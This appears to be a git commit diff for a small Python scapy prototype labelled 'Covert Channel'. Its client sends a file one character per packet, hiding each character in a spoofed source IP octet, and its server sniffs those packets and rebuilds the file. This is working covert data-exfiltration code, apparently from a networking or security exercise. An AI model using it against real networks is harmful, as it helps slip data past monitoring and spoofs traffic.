55cb6c4ea86f8a33a6baf1d7e04c03b379a09f0a
Nishan Vivek <roachx@gmail.com>
2017-09-28 16:09:52 -0700

    Working client and server prototype 0.1.0

--- client.py
+++ client.py
@@ -1,23 +1,30 @@
 import argparse
 
 from scapy.all import *
-from scapy.layers.inet import IP
+from scapy.layers.inet import IP, TCP
 
 # Argparse setup
 parser = argparse.ArgumentParser(description="Covert Channel")
 parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
 parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
+parser.add_argument('-s', '--subnet', dest='subnet', help='First 3 octects of source subnet ', required=True)
 parser.add_argument('-f', '--file', dest='filename', help='File to send', required=True)
 args = parser.parse_args()
 
 
 def main():
     # Open the file to be sent
-    with open(args.file, "r") as payloadFile:
+    print 'Sending File:' + args.filename
+    with open(args.filename, "r") as payloadFile:
         payload = payloadFile.read().rstrip('\n')
+
 
         # Iterate through payload and create/send one packet per char
         for byt in payload:
+            print(byt)
             uniCode = ord(byt)  # returns unicode int
-            pack = IP(dst=args.dest, src="192.168.1." + pack)
+            pack = IP(dst=args.dest, src=args.subnet + "." + `uniCode`)/TCP(sport=8081, dport=int(args.port), window=4096)
             send(pack)
+
+if __name__ == '__main__':
+    main()
--- server.py
+++ server.py
@@ -11,16 +11,19 @@ args = parser.parse_args()
 
 
 def parse(pkt):
+    print('Packet Found')
     ip_address = pkt['IP'].src
     coded_message = ip_address.split('.')
-    byt = chr(int(coded_message))
+    byt = chr(int(coded_message[3]))
+    print(byt)
     filehandler = open(args.filename, 'a')
-    filehandler.write(byt + '\n')
+    filehandler.write(byt)
     filehandler.close()
 
 
 def main():
-    sniff(filter="dst port" + args.port, prn=parse)
+    print('Server Started')
+    sniff(filter="dst port " + args.port, prn=parse)
 
 
 if __name__ == '__main__':
